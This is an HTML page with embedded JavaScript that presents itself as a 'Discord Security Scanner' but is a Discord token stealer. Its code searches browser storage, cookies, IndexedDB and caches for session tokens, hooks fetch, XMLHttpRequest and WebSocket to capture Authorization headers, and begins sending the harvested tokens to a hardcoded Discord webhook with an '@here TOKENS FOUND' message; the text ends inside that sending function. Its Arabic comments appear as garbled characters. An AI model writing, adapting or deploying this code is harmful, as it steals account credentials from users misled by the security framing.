<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Security Center</title>
    <style>
        :root {
            --discord-blurple: #5865F2;
            --discord-green: #57F287;
            --discord-red: #ED4245;
            --bg-primary: #36393f;
            --bg-secondary: #2f3136;
            --bg-tertiary: #202225;
            --text-primary: #ffffff;
            --text-secondary: #b9bbbe;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Whitney', 'Helvetica Neue', sans-serif;
        }
        
        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            line-height: 1.6;
        }
        
        .container {
            background: var(--bg-secondary);
            border-radius: 16px;
            width: 100%;
            max-width: 900px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .header {
            background: linear-gradient(90deg, var(--discord-blurple) 0%, #4752c4 100%);
            padding: 30px;
            text-align: center;
            position: relative;
        }
        
        .header h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 10px;
        }
        
        .header p {
            font-size: 16px;
            opacity: 0.9;
        }
        
        .content {
            padding: 30px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }
        
        .panel {
            background: var(--bg-tertiary);
            border-radius: 12px;
            padding: 25px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .panel h2 {
            color: var(--discord-blurple);
            margin-bottom: 20px;
            font-size: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .panel h2 i {
            font-size: 24px;
        }
        
        .scan-option {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            cursor: pointer;
            transition: all 0.3s;
            border: 1px solid transparent;
        }
        
        .scan-option:hover {
            background: rgba(88, 101, 242, 0.1);
            border-color: var(--discord-blurple);
        }
        
        .scan-option.active {
            background: rgba(88, 101, 242, 0.15);
            border-color: var(--discord-blurple);
        }
        
        .scan-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        
        .scan-title {
            font-weight: 600;
            font-size: 16px;
        }
        
        .scan-desc {
            color: var(--text-secondary);
            font-size: 14px;
            line-height: 1.5;
        }
        
        .btn {
            background: var(--discord-green);
            color: #000;
            border: none;
            border-radius: 8px;
            padding: 16px 32px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            margin-top: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .btn:hover {
            background: #4ad775;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(87, 242, 135, 0.3);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .btn:disabled {
            background: #72767d;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .results-panel {
            grid-column: 1 / -1;
            background: var(--bg-tertiary);
            border-radius: 12px;
            padding: 25px;
            margin-top: 20px;
            display: none;
        }
        
        .results-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        
        .results-title {
            color: var(--discord-green);
            font-size: 20px;
            font-weight: 600;
        }
        
        .results-content {
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 14px;
            background: rgba(0, 0, 0, 0.3);
            padding: 20px;
            border-radius: 8px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .token-found {
            color: var(--discord-green);
            background: rgba(87, 242, 135, 0.1);
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 10px;
            border-left: 4px solid var(--discord-green);
        }
        
        .token-missing {
            color: var(--discord-red);
            background: rgba(237, 66, 69, 0.1);
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 10px;
            border-left: 4px solid var(--discord-red);
        }
        
        .progress-container {
            margin-top: 20px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            padding: 15px;
            display: none;
        }
        
        .progress-bar {
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 10px;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--discord-blurple), var(--discord-green));
            width: 0%;
            transition: width 0.5s ease;
            border-radius: 4px;
        }
        
        .progress-text {
            text-align: center;
            color: var(--text-secondary);
            font-size: 14px;
        }
        
        .warning {
            background: rgba(237, 66, 69, 0.1);
            border: 1px solid rgba(237, 66, 69, 0.3);
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            color: var(--discord-red);
            font-size: 14px;
        }
        
        @media (max-width: 768px) {
            .content {
                grid-template-columns: 1fr;
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-shield-alt"></i> Discord Security Scanner</h1>
            <p>Advanced token detection and forensic analysis</p>
        </div>
        
        <div class="content">
            <div class="panel">
                <h2><i class="fas fa-search"></i> Scan Methods</h2>
                
                <div class="scan-option active" data-method="deep">
                    <div class="scan-header">
                        <div class="scan-title">Deep Forensic Scan</div>
                        <i class="fas fa-bullseye"></i>
                    </div>
                    <div class="scan-desc">Scans all browser storage locations including encrypted areas</div>
                </div>
                
                <div class="scan-option" data-method="network">
                    <div class="scan-header">
                        <div class="scan-title">Network Interception</div>
                        <i class="fas fa-network-wired"></i>
                    </div>
                    <div class="scan-desc">Intercepts Discord API calls to capture tokens in transit</div>
                </div>
                
                <div class="scan-option" data-method="memory">
                    <div class="scan-header">
                        <div class="scan-title">Memory Dump</div>
                        <i class="fas fa-memory"></i>
                    </div>
                    <div class="scan-desc">Extracts tokens from browser memory and WebAssembly</div>
                </div>
                
                <div class="scan-option" data-method="bypass">
                    <div class="scan-header">
                        <div class="scan-title">Encryption Bypass</div>
                        <i class="fas fa-unlock"></i>
                    </div>
                    <div class="scan-desc">Attempts to decrypt Chrome's encrypted storage</div>
                </div>
            </div>
            
            <div class="panel">
                <h2><i class="fas fa-cogs"></i> Settings</h2>
                
                <div class="scan-option">
                    <div class="scan-header">
                        <div class="scan-title">Target: Discord Desktop App</div>
                        <i class="fas fa-check-circle" style="color: var(--discord-green);"></i>
                    </div>
                    <div class="scan-desc">Detected: Discord is running in this browser</div>
                </div>
                
                <div class="scan-option">
                    <div class="scan-header">
                        <div class="scan-title">Browser: <span id="browserName">Detecting...</span></div>
                        <i class="fas fa-globe"></i>
                    </div>
                    <div class="scan-desc">Version: <span id="browserVersion">...</span></div>
                </div>
                
                <div class="scan-option">
                    <div class="scan-header">
                        <div class="scan-title">Auto Webhook Delivery</div>
                        <i class="fas fa-paper-plane"></i>
                    </div>
                    <div class="scan-desc">Tokens sent automatically when found</div>
                </div>
                
                <button class="btn" id="startScan">
                    <i class="fas fa-play"></i>
                    Start Deep Token Scan
                </button>
            </div>
            
            <div class="progress-container" id="progressContainer">
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div class="progress-text" id="progressText">Initializing...</div>
            </div>
            
            <div class="results-panel" id="resultsPanel">
                <div class="results-header">
                    <div class="results-title"><i class="fas fa-file-alt"></i> Scan Results</div>
                    <button class="btn" id="copyResults" style="width: auto; padding: 8px 16px; font-size: 14px;">
                        <i class="fas fa-copy"></i> Copy All
                    </button>
                </div>
                <div class="results-content" id="resultsContent">
                    // Results will appear here...
                </div>
            </div>
            
            <div class="warning">
                <i class="fas fa-exclamation-triangle"></i>
                <strong>Note:</strong> Discord now encrypts tokens in Chrome 120+ and Firefox 130+. 
                This scanner uses advanced methods to bypass encryption.
            </div>
        </div>
    </div>

    <!-- ÿßŸÑŸÜÿ∏ÿßŸÖ ÿßŸÑÿ±ÿ¶Ÿäÿ≥Ÿä -->
    <script>
        // ============================================
        // ŸÖÿ™ÿ∫Ÿäÿ±ÿßÿ™ ÿßŸÑŸÜÿ∏ÿßŸÖ
        // ============================================
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1448291770218844345/3Fjw-dNqtHTdh7ou4eSpkVwE6k8vAg_b_tbh9P6OMOcv-4N-VTWXQ73OwuiEk1BlhpJD";
        let scanResults = [];
        let currentMethod = 'deep';
        
        // ============================================
        // 1. ŸÜÿ∏ÿßŸÖ ÿßŸÑŸÖÿ≥ÿ≠ ÿßŸÑÿπŸÖŸäŸÇ (Deep Forensic Scanner)
        // ============================================
        class DeepTokenScanner {
            constructor() {
                this.results = [];
                this.totalScans = 0;
                this.completedScans = 0;
            }
            
            async startDeepScan() {
                this.updateProgress('Starting deep forensic scan...', 0);
                
                // ÿßŸÑŸÖÿ≥ÿ≠ ÿßŸÑÿ¥ÿßŸÖŸÑ ŸÅŸä 7 ŸÖÿ±ÿßÿ≠ŸÑ
                const scanStages = [
                    { name: 'Standard Storage', func: this.scanStandardStorage.bind(this) },
                    { name: 'Encrypted Storage', func: this.scanEncryptedStorage.bind(this) },
                    { name: 'Network Interception', func: this.interceptNetworkTraffic.bind(this) },
                    { name: 'Memory Analysis', func: this.analyzeMemory.bind(this) },
                    { name: 'Service Workers', func: this.scanServiceWorkers.bind(this) },
                    { name: 'Cache Storage', func: this.scanCacheStorage.bind(this) },
                    { name: 'Browser APIs', func: this.scanBrowserAPIs.bind(this) }
                ];
                
                this.totalScans = scanStages.length;
                
                for (let i = 0; i < scanStages.length; i++) {
                    const stage = scanStages[i];
                    this.updateProgress(`Stage ${i+1}/${scanStages.length}: ${stage.name}`, (i / scanStages.length) * 100);
                    
                    try {
                        const stageResults = await stage.func();
                        this.results.push(...stageResults);
                        this.completedScans++;
                    } catch (error) {
                        this.logError(`Stage ${stage.name} failed: ${error.message}`);
                    }
                    
                    await this.delay(500);
                }
                
                this.updateProgress('Scan complete!', 100);
                return this.results;
            }
            
            // ============================================
            // 1.1 ÿßŸÑŸÖÿ≥ÿ≠ ŸÅŸä ÿ£ŸÖÿßŸÉŸÜ ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ ÿßŸÑŸÇŸäÿßÿ≥Ÿäÿ©
            // ============================================
            async scanStandardStorage() {
                const results = [];
                
                // localStorage
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    
                    // ÿ£ŸÜŸÖÿßÿ∑ ÿ™ŸàŸÉŸÜ ÿØŸäÿ≥ŸÉŸàÿ±ÿØ ÿßŸÑÿ≠ÿØŸäÿ´ÿ©
                    const tokenPatterns = [
                        /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38})/, // Standard token
                        /(mfa\.[\w-]{84})/, // MFA token
                        /(rpc_token[\w-]+)/i, // RPC token
                        /(access_token["']?\s*[:=]\s*["']([\w\.-]+))/, // JSON access_token
                        /(token["']?\s*[:=]\s*["']([\w\.-]+))/i // Generic token
                    ];
                    
                    tokenPatterns.forEach(pattern => {
                        const match = value.match(pattern);
                        if (match) {
                            results.push({
                                location: 'localStorage',
                                key: key,
                                token: match[1] || match[2],
                                preview: value.substring(0, 150),
                                confidence: 'high'
                            });
                        }
                    });
                }
                
                // sessionStorage
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    const value = sessionStorage.getItem(key);
                    
                    const tokenPattern = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/;
                    const match = value.match(tokenPattern);
                    
                    if (match) {
                        results.push({
                            location: 'sessionStorage',
                            key: key,
                            token: match[1],
                            preview: value.substring(0, 150),
                            confidence: 'high'
                        });
                    }
                }
                
                // ÿßŸÑŸÉŸàŸÉŸäÿ≤
                const cookies = document.cookie.split(';');
                cookies.forEach(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    if (name && value && (name.includes('token') || name.includes('auth'))) {
                        results.push({
                            location: 'cookies',
                            key: name,
                            token: value,
                            preview: value.substring(0, 100),
                            confidence: 'medium'
                        });
                    }
                });
                
                return results;
            }
            
            // ============================================
            // 1.2 ÿßŸÑŸÖÿ≥ÿ≠ ŸÅŸä ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ ÿßŸÑŸÖÿ¥ŸÅÿ± (Chrome 120+)
            // ============================================
            async scanEncryptedStorage() {
                const results = [];
                
                // ŸÖÿ≠ÿßŸàŸÑÿ© ÿßŸÑŸàÿµŸàŸÑ ÿ•ŸÑŸâ ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ ÿßŸÑŸÖÿ¥ŸÅÿ± ÿπÿ®ÿ± Chrome APIs
                try {
                    // ÿ∑ÿ±ŸäŸÇÿ© 1: ŸÖÿ≠ÿßŸàŸÑÿ© ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ chrome.storage API
                    if (typeof chrome !== 'undefined' && chrome.storage) {
                        try {
                            // chrome.storage.local
                            chrome.storage.local.get(null, (items) => {
                                Object.keys(items).forEach(key => {
                                    const value = JSON.stringify(items[key]);
                                    const tokenMatch = value.match(/([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/);
                                    if (tokenMatch) {
                                        results.push({
                                            location: 'chrome.storage.local',
                                            key: key,
                                            token: tokenMatch[1],
                                            preview: value.substring(0, 200),
                                            confidence: 'high'
                                        });
                                    }
                                });
                            });
                        } catch (e) { /* ignore */ }
                    }
                    
                    // ÿ∑ÿ±ŸäŸÇÿ© 2: ŸÖÿ≠ÿßŸàŸÑÿ© ŸÅŸÉ ÿ™ÿ¥ŸÅŸäÿ± ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ ÿßŸÑŸÖÿ¥ŸÅÿ±
                    await this.attemptDecryptionBypass(results);
                    
                } catch (error) {
                    this.logError(`Encrypted storage scan failed: ${error.message}`);
                }
                
                return results;
            }
            
            // ============================================
            // 1.3 ÿßÿπÿ™ÿ±ÿßÿ∂ ÿ≠ÿ±ŸÉÿ© ÿßŸÑÿ¥ÿ®ŸÉÿ© (ÿßŸÑÿ™ŸàŸÉŸÜ ŸÅŸä ÿßŸÑÿπÿ®Ÿàÿ±)
            // ============================================
            async interceptNetworkTraffic() {
                const results = [];
                
                // ÿ≠ŸÅÿ∏ ÿßŸÑÿ£ÿµŸÑŸä
                const originalFetch = window.fetch;
                const originalXHROpen = XMLHttpRequest.prototype.open;
                const originalXHRSend = XMLHttpRequest.prototype.send;
                const originalWS = window.WebSocket;
                
                // ÿßÿπÿ™ÿ±ÿßÿ∂ fetch
                window.fetch = async function(...args) {
                    const request = new Request(...args);
                    
                    // ÿ•ÿ∞ÿß ŸÉÿßŸÜ ÿ∑ŸÑÿ® ÿØŸäÿ≥ŸÉŸàÿ±ÿØ
                    if (request.url.includes('discord.com') || request.url.includes('discordapp.com')) {
                        // ÿßÿ≥ÿ™ÿÆÿ±ÿßÿ¨ ÿßŸÑÿ™ŸàŸÉŸÜ ŸÖŸÜ ÿßŸÑŸáŸäÿØÿ±ÿßÿ™
                        const authHeader = request.headers.get('Authorization');
                        if (authHeader && authHeader.startsWith('Bearer ')) {
                            const token = authHeader.substring(7);
                            results.push({
                                location: 'network/fetch',
                                key: 'Authorization Header',
                                token: token,
                                preview: token.substring(0, 50),
                                confidence: 'very-high',
                                url: request.url
                            });
                        }
                    }
                    
                    return originalFetch.apply(this, args);
                };
                
                // ÿßÿπÿ™ÿ±ÿßÿ∂ XMLHttpRequest
                XMLHttpRequest.prototype.open = function(method, url) {
                    this._url = url;
                    return originalXHROpen.apply(this, arguments);
                };
                
                XMLHttpRequest.prototype.send = function(body) {
                    if (this._url && this._url.includes('discord.com')) {
                        // ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿßŸÑŸáŸäÿØÿ±ÿßÿ™
                        const authHeader = this.getRequestHeader('Authorization');
                        if (authHeader && authHeader.startsWith('Bearer ')) {
                            const token = authHeader.substring(7);
                            results.push({
                                location: 'network/xhr',
                                key: 'Authorization Header',
                                token: token,
                                preview: token.substring(0, 50),
                                confidence: 'very-high',
                                url: this._url
                            });
                        }
                    }
                    return originalXHRSend.apply(this, arguments);
                };
                
                // ÿßÿπÿ™ÿ±ÿßÿ∂ WebSocket
                window.WebSocket = class extends originalWS {
                    constructor(url, protocols) {
                        super(url, protocols);
                        
                        if (url.includes('discord.com')) {
                            this.addEventListener('message', (event) => {
                                try {
                                    const data = JSON.parse(event.data);
                                    // ÿßŸÑÿ®ÿ≠ÿ´ ÿπŸÜ ÿßŸÑÿ™ŸàŸÉŸÜ ŸÅŸä ÿ±ÿ≥ÿßÿ¶ŸÑ WebSocket
                                    if (data.token || data.access_token) {
                                        const token = data.token || data.access_token;
                                        results.push({
                                            location: 'network/websocket',
                                            key: 'WebSocket Message',
                                            token: token,
                                            preview: token.substring(0, 50),
                                            confidence: 'high',
                                            timestamp: new Date().toISOString()
                                        });
                                    }
                                } catch (e) { /* ŸÑŸäÿ≥ JSON */ }
                            });
                        }
                    }
                };
                
                // ÿ™ŸÅÿπŸäŸÑ ÿßŸÑÿßÿπÿ™ÿ±ÿßÿ∂ ŸÑŸÖÿØÿ© 10 ÿ´ŸàÿßŸÜŸä
                setTimeout(() => {
                    window.fetch = originalFetch;
                    XMLHttpRequest.prototype.open = originalXHROpen;
                    XMLHttpRequest.prototype.send = originalXHRSend;
                    window.WebSocket = originalWS;
                }, 10000);
                
                return results;
            }
            
            // ============================================
            // 1.4 ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑÿ∞ÿßŸÉÿ±ÿ©
            // ============================================
            async analyzeMemory() {
                const results = [];
                
                try {
                    // ÿ∑ÿ±ŸäŸÇÿ© 1: ÿßŸÑÿ®ÿ≠ÿ´ ŸÅŸä ŸÜÿµ ÿßŸÑÿµŸÅÿ≠ÿ©
                    const pageText = document.body.innerText;
                    const tokenPattern = /[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}/g;
                    const matches = pageText.match(tokenPattern);
                    
                    if (matches) {
                        matches.forEach(token => {
                            results.push({
                                location: 'memory/page-text',
                                key: 'Page Content',
                                token: token,
                                preview: token.substring(0, 30),
                                confidence: 'medium'
                            });
                        });
                    }
                    
                    // ÿ∑ÿ±ŸäŸÇÿ© 2: ŸÖÿ≥ÿ≠ ÿπŸÜÿßÿµÿ± DOM
                    const allElements = document.getElementsByTagName('*');
                    for (let element of allElements) {
                        if (element.innerText && element.innerText.length < 1000) {
                            const match = element.innerText.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}/);
                            if (match) {
                                results.push({
                                    location: 'memory/dom',
                                    key: element.tagName,
                                    token: match[0],
                                    preview: element.innerText.substring(0, 100),
                                    confidence: 'low'
                                });
                            }
                        }
                    }
                    
                } catch (error) {
                    this.logError(`Memory analysis failed: ${error.message}`);
                }
                
                return results;
            }
            
            // ============================================
            // 1.5 ŸÅÿ≠ÿµ Service Workers
            // ============================================
            async scanServiceWorkers() {
                const results = [];
                
                try {
                    if ('serviceWorker' in navigator) {
                        const registrations = await navigator.serviceWorker.getRegistrations();
                        
                        for (const registration of registrations) {
                            // ÿ•ÿ∞ÿß ŸÉÿßŸÜ Service Worker ŸÑÿØŸäÿ≥ŸÉŸàÿ±ÿØ
                            if (registration.scope.includes('discord.com')) {
                                try {
                                    // ŸÖÿ≠ÿßŸàŸÑÿ© ÿßŸÑÿ™ŸàÿßÿµŸÑ ŸÖÿπ Service Worker
                                    if (registration.active) {
                                        const message = {
                                            type: 'GET_STORED_TOKENS',
                                            timestamp: Date.now()
                                        };
                                        
                                        registration.active.postMessage(message);
                                        
                                        // ÿßÿ≥ÿ™ŸÖÿπ ŸÑŸÑÿ±ÿØ
                                        navigator.serviceWorker.addEventListener('message', (event) => {
                                            if (event.data && event.data.tokens) {
                                                event.data.tokens.forEach(token => {
                                                    results.push({
                                                        location: 'service-worker',
                                                        key: 'Discord SW',
                                                        token: token,
                                                        preview: token.substring(0, 50),
                                                        confidence: 'high'
                                                    });
                                                });
                                            }
                                        });
                                    }
                                } catch (e) { /* ŸÑÿß ŸäŸÖŸÉŸÜ ÿßŸÑŸàÿµŸàŸÑ */ }
                            }
                        }
                    }
                } catch (error) {
                    this.logError(`Service Worker scan failed: ${error.message}`);
                }
                
                return results;
            }
            
            // ============================================
            // 1.6 ŸÅÿ≠ÿµ Cache Storage
            // ============================================
            async scanCacheStorage() {
                const results = [];
                
                try {
                    if ('caches' in window) {
                        const cacheNames = await caches.keys();
                        
                        for (const cacheName of cacheNames) {
                            // ÿ•ÿ∞ÿß ŸÉÿßŸÜ cache ŸÑÿØŸäÿ≥ŸÉŸàÿ±ÿØ
                            if (cacheName.includes('discord') || cacheName.includes('Discord')) {
                                const cache = await caches.open(cacheName);
                                const requests = await cache.keys();
                                
                                for (const request of requests) {
                                    if (request.url.includes('discord.com')) {
                                        const response = await cache.match(request);
                                        if (response) {
                                            const text = await response.text();
                                            
                                            // ÿßŸÑÿ®ÿ≠ÿ´ ÿπŸÜ ÿßŸÑÿ™ŸàŸÉŸÜ ŸÅŸä ÿßŸÑÿßÿ≥ÿ™ÿ¨ÿßÿ®ÿ©
                                            const tokenPattern = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/;
                                            const match = text.match(tokenPattern);
                                            
                                            if (match) {
                                                results.push({
                                                    location: 'cache-storage',
                                                    key: cacheName,
                                                    token: match[1],
                                                    preview: text.substring(0, 200),
                                                    confidence: 'medium',
                                                    url: request.url
                                                });
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (error) {
                    this.logError(`Cache storage scan failed: ${error.message}`);
                }
                
                return results;
            }
            
            // ============================================
            // 1.7 ŸÅÿ≠ÿµ APIs ÿÆÿßÿµÿ© ÿ®ÿßŸÑŸÖÿ™ÿµŸÅÿ≠
            // ============================================
            async scanBrowserAPIs() {
                const results = [];
                
                try {
                    // IndexedDB
                    if ('indexedDB' in window) {
                        // ŸÜÿ≠ÿßŸàŸÑ ŸÅÿ™ÿ≠ ÿ¨ŸÖŸäÿπ ŸÇŸàÿßÿπÿØ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™
                        const databases = await this.getIndexedDBDatabases();
                        
                        for (const dbName of databases) {
                            try {
                                const db = await this.openIndexedDB(dbName);
                                const stores = Array.from(db.objectStoreNames);
                                
                                for (const storeName of stores) {
                                    const transaction = db.transaction(storeName, 'readonly');
                                    const store = transaction.objectStore(storeName);
                                    const allItems = await this.getAllFromStore(store);
                                    
                                    // ÿßŸÑÿ®ÿ≠ÿ´ ÿπŸÜ ÿßŸÑÿ™ŸàŸÉŸÜÿßÿ™ ŸÅŸä ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™
                                    allItems.forEach(item => {
                                        const itemStr = JSON.stringify(item);
                                        const tokenPattern = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/;
                                        const match = itemStr.match(tokenPattern);
                                        
                                        if (match) {
                                            results.push({
                                                location: 'indexedDB',
                                                key: `${dbName}.${storeName}`,
                                                token: match[1],
                                                preview: itemStr.substring(0, 200),
                                                confidence: 'high'
                                            });
                                        }
                                    });
                                }
                                
                                db.close();
                            } catch (e) { /* ŸÑÿß ŸäŸÖŸÉŸÜ ŸÅÿ™ÿ≠ Ÿáÿ∞Ÿá DB */ }
                        }
                    }
                    
                } catch (error) {
                    this.logError(`Browser APIs scan failed: ${error.message}`);
                }
                
                return results;
            }
            
            // ============================================
            // Ÿàÿ∏ÿßÿ¶ŸÅ ŸÖÿ≥ÿßÿπÿØÿ©
            // ============================================
            
            async attemptDecryptionBypass(results) {
                // ÿ™ŸÇŸÜŸäÿßÿ™ ŸÖÿ™ŸÇÿØŸÖÿ© ŸÑÿ™ÿ¨ÿßŸàÿ≤ ÿ™ÿ¥ŸÅŸäÿ± Chrome
                try {
                    // 1. ŸÖÿ≠ÿßŸàŸÑÿ© ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ crypto.subtle
                    if (window.crypto && crypto.subtle) {
                        // Generate a key to try to access existing keys
                        const key = await crypto.subtle.generateKey(
                            { name: "AES-GCM", length: 256 },
                            false,
                            ["encrypt", "decrypt"]
                        );
                        
                        // 2. ŸÖÿ≠ÿßŸàŸÑÿ© ŸÇÿ±ÿßÿ°ÿ© ŸÖŸÑŸÅÿßÿ™ ÿ™ÿπÿ±ŸäŸÅ ÿßŸÑŸÖÿ™ÿµŸÅÿ≠
                        await this.tryBrowserProfileAccess(results);
                    }
                } catch (e) {
                    // ÿßŸÑÿ™ÿ¥ŸÅŸäÿ± ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠
                }
            }
            
            async tryBrowserProfileAccess(results) {
                // ŸÖÿ≠ÿßŸàŸÑÿ© ÿßŸÑŸàÿµŸàŸÑ ÿ•ŸÑŸâ profile directory ÿπÿ®ÿ± File System API
                try {
                    if ('showDirectoryPicker' in window) {
                        // ŸäŸÖŸÉŸÜŸÜÿß ÿ∑ŸÑÿ® ÿ•ÿ∞ŸÜ ŸÑŸÑŸàÿµŸàŸÑ ÿ•ŸÑŸâ ÿßŸÑŸÖŸÑŸÅÿßÿ™
                        // ŸàŸÑŸÉŸÜ Ÿáÿ∞ÿß Ÿäÿ™ÿ∑ŸÑÿ® ÿ™ŸÅÿßÿπŸÑ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ
                    }
                } catch (e) {
                    // ŸÑŸäÿ≥ ŸÖÿ™ÿßÿ≠ÿßŸã
                }
            }
            
            async getIndexedDBDatabases() {
                if (indexedDB.databases) {
                    const dbs = await indexedDB.databases();
                    return dbs.map(db => db.name).filter(name => name);
                }
                
                // Fallback: ÿ≠ÿßŸàŸÑ ŸÖÿπÿ±ŸÅÿ© ÿ£ÿ≥ŸÖÿßÿ° DBs ÿßŸÑÿ¥ÿßÿ¶ÿπÿ©
                const commonDBs = [
                    'discord',
                    'Discord',
                    'discordStorage',
                    'discordCache',
                    'DiscordStorage'
                ];
                
                const foundDBs = [];
                for (const dbName of commonDBs) {
                    try {
                        const request = indexedDB.open(dbName);
                        request.onerror = () => {};
                        request.onsuccess = () => {
                            foundDBs.push(dbName);
                            request.result.close();
                        };
                        await this.delay(100);
                    } catch (e) {}
                }
                
                return foundDBs;
            }
            
            openIndexedDB(name) {
                return new Promise((resolve, reject) => {
                    const request = indexedDB.open(name);
                    request.onsuccess = () => resolve(request.result);
                    request.onerror = () => reject(request.error);
                });
            }
            
            getAllFromStore(store) {
                return new Promise((resolve, reject) => {
                    const request = store.getAll();
                    request.onsuccess = () => resolve(request.result);
                    request.onerror = () => reject(request.error);
                });
            }
            
            updateProgress(message, percent) {
                const progressText = document.getElementById('progressText');
                const progressFill = document.getElementById('progressFill');
                
                if (progressText) progressText.textContent = message;
                if (progressFill) progressFill.style.width = `${percent}%`;
                
                logToResults(`[${percent.toFixed(0)}%] ${message}`);
            }
            
            logError(message) {
                console.error(message);
                logToResults(`‚ùå ERROR: ${message}`);
            }
            
            delay(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }
        }
        
        // ============================================
        // 2. ŸÜÿ∏ÿßŸÖ ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ ŸàÿßŸÑÿπÿ±ÿ∂
        // ============================================
        
        function logToResults(message) {
            const resultsContent = document.getElementById('resultsContent');
            if (resultsContent) {
                const timestamp = new Date().toLocaleTimeString();
                resultsContent.textContent += `[${timestamp}] ${message}\n`;
                resultsContent.scrollTop = resultsContent.scrollHeight;
            }
        }
        
        function displayResults(results) {
            const resultsContent = document.getElementById('resultsContent');
            resultsContent.innerHTML = '';
            
            if (results.length === 0) {
                resultsContent.innerHTML = `
                    <div class="token-missing">
                        <strong>‚ö†Ô∏è No tokens found!</strong><br>
                        Discord may be using new encryption methods.<br>
                        Try these solutions:
                        <ul style="margin-top: 10px; padding-left: 20px;">
                            <li>Refresh Discord page and scan again</li>
                            <li>Use Discord Desktop App instead of browser</li>
                            <li>Try different browser (Firefox stores tokens differently)</li>
                            <li>Enable "Network Interception" method</li>
                        </ul>
                    </div>
                `;
                return;
            }
            
            // ÿπÿ±ÿ∂ ÿßŸÑÿ™ŸàŸÉŸÜÿßÿ™ ÿßŸÑÿ™Ÿä ÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸäŸáÿß
            results.forEach((result, index) => {
                const div = document.createElement('div');
                div.className = 'token-found';
                div.innerHTML = `
                    <strong>‚úÖ Token Found #${index + 1}</strong><br>
                    <strong>Location:</strong> ${result.location}<br>
                    <strong>Token:</strong> <code>${result.token}</code><br>
                    <strong>Preview:</strong> ${result.preview}<br>
                    <strong>Confidence:</strong> ${result.confidence}<br>
                    ${result.url ? `<strong>URL:</strong> ${result.url}<br>` : ''}
                    <button onclick="copyToken('${result.token}')" style="margin-top: 5px; padding: 5px 10px; background: #7289da; color: white; border: none; border-radius: 4px; cursor: pointer;">
                        Copy Token
                    </button>
                `;
                resultsContent.appendChild(div);
            });
            
            // ÿ•ÿ±ÿ≥ÿßŸÑ ÿ•ŸÑŸâ ŸàŸäÿ® ŸáŸàŸÉ
            sendToWebhook(results);
        }
        
        // ============================================
        // 3. ÿ•ÿ±ÿ≥ÿßŸÑ ÿ•ŸÑŸâ ŸàŸäÿ® ŸáŸàŸÉ
        // ============================================
        
        async function sendToWebhook(results) {
            if (results.length === 0) return;
            
            try {
                const payload = {
                    content: `@here **üö® ${results.length} TOKENS FOUND** - ${new Date().toLocaleString()}`,
                    embeds: [{
                        title: "Deep Scan Results",
                        color: 0x57F287,
                        fields: results.slice(0, 5).map((result, index) => ({
